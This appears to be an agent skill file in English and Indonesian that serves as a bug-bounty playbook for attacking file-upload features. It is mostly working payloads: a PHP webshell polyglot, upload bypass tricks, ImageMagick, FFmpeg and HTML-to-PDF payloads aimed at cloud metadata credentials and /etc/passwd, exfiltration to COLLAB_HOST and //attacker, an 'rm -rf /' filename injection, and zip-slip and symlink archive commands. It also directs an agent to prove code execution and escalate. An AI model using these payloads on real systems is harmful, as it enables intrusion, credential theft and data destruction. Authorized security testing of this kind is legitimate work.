---
name: hunt-file-upload
description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples."
sources: hackerone_public, cve_database, owasp, public_research
report_count: 5
---

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §C): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`


## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg Exploitation

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF Generator SSRF

### HTML → PDF Converter Attacks
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

## Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Ekstensi ganda: `.php.jpg`, `.phtml`, `.svg`, `.html` | Filter berbasis ekstensi terakhir |
| 2 | MIME spoof: `Content-Type: image/jpeg` dengan isi PHP | Validasi hanya pada header |
| 3 | SVG/HTML upload: `<svg onload=...>` → XSS tersimpan | Stored XSS via upload |
| 4 | `.htaccess`/`web.config` upload: aktifkan eksekusi | Konfigurasi server diubah |
| 5 | Path traversal di nama file: `../../../../var/www/shell.php` | Tulis di luar direktori upload |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa mengunggah file `.php` yang dieksekusi server sebagai web shell" — tunjukkan output perintah.
2. **Apa yang hilang dari korban?** Eksekusi kode di server = RCE. Untuk XSS via SVG, sebutkan eksekusi JS di origin.
3. **Bisa direproduksi 10 menit dari nol?** Unggah file, akses, tunjukkan hasil. Bersihkan artefak setelahnya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** tulis file ke server

**Teknik pengembangan:** webshell -> RCE; SVG/HTML -> stored XSS; .htaccess -> override

**Eskalasi ke:** `hunt-rce` · `hunt-xss`

**Depth target:** L3 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Related Skills & Chains

- **Surface atlas** (`security/bb-audit-launcher/references/rce-surface-atlas.md`) — the 10 RCE entry points (7 web2 + 3 web3 analogues): where to look, what proves execution, severity per surface. This skill is the payload depth; the atlas is the coverage checklist.

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.


## 2026 sweep 5 (dork pass 2026-10-18 — 2 repo)

- CVE-2026-85097 — Bricksforge WordPress plugin **unauthenticated arbitrary file upload → RCE** toolkit. Lesson: plugin upload handlers that skip capability checks are the highest-yield WordPress primitive; fingerprint plugins before probing core.
  - CVE-2026-85097 - Bricksforge WordPress Plugin Unauthenticated File Upload to RCE Toolkit
- CVE-2026-57827 — RSFiles! Joomla **unauthenticated file upload RCE** via split-controller upload bypass → direct write task → `/downloads/shell.php`. Lesson: 'split controller' routing (separate upload handler from the auth-checked one) is a recurring Joomla pattern.


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

| Kondisi | Severity |
|---|---|
| Upload → webshell → RCE | Critical |
| Upload → path traversal → tulis file arbitrer | Critical |
| Upload SVG/HTML → stored XSS | High |
| Upload → SSRF via image processing (image-tragick) | High-Critical |
| Upload → DoS (decompression bomb, oversized) | Medium |
| Upload hanya membatasi ekstensi, bukan content-type & content | Medium |

**Kalibrasi wajib:** ekstensi yang diblokir tapi content-type dan magic bytes tidak diperiksa =
bypass hampir pasti. Uji double extension (`.php.jpg`), null byte (`.php%00.jpg`), dan
case variation (`.PhP`).

## 2026 sweep

- **CVE-2026-85097 (Bricksforge)** — unauthenticated arbitrary file upload → RCE. Plugin upload
  handler yang skip capability check = primitif WordPress tertinggi. Fingerprint plugin sebelum
  probing core.
- **CVE-2026-57827 (RSFiles! Joomla)** — split-controller upload bypass → direct write task →
  `/downloads/shell.php`. Pola "split controller" (handler upload terpisah dari yang cek auth)
  adalah pola Joomla yang berulang.
- **Polyglot file** — file yang valid sebagai gambar DAN sebagai script (GIFAR, SVG+HTML).
- **Content-Type dari client** — server percaya `Content-Type` yang dikirim client untuk validasi.
